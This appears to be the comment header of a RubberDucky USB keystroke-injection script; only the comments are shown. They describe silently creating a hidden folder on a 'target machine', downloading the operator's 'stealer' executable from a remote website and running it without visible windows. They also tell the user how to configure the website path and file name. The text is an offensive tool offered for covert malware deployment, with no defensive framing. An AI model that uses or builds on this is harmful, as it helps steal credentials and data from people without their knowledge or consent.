#This RubberDucky script will do everything in silence. 
#It creates a hidden folder on the target machine and proceeds to download your stealer file supposedly named "setup.exe" from your remote website.
#After the download is complete, the script runs the downloaded file without triggering any visible windows, ensuring a discreet execution.
#Modify the stealer.txt and add your website path as well as modify "setup.exe" with your desired .exe file name.
